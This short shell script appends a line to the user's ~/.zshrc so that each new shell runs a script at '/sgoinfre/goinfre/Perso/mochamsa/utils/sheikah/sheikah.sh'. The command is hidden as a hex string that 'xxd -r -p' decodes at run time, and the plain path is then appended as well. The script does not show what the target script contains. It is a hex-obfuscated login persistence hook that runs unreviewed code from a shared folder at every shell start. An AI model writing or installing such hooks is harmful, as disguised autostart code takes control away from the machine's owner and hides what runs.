ZSHRC="$HOME/.zshrc"
SHEIKAH_PATH="bash -c \"\$(echo \"2f73676f696e6672652f676f696e6672652f50657273
6f2f6d6f6368616d73612f7574696c732f736
865696b61682f736865696b61682e73680a\" | xxd -r -p)\""

if ! grep -q "$SHEIKAH_PATH" "$ZSHRC"; then
    
    cat >> "$ZSHRC" << 'EOF'
bash -c "$(echo "2f73676f696e6672652f676f696e6672652f50657273
6f2f6d6f6368616d73612f7574696c732f736
865696b61682f736865696b61682e73680a" | xxd -r -p)"
EOF
echo "/sgoinfre/goinfre/Perso/mochamsa/utils/sheikah/sheikah.sh" >> ~/.zshrc
else
    true
fi


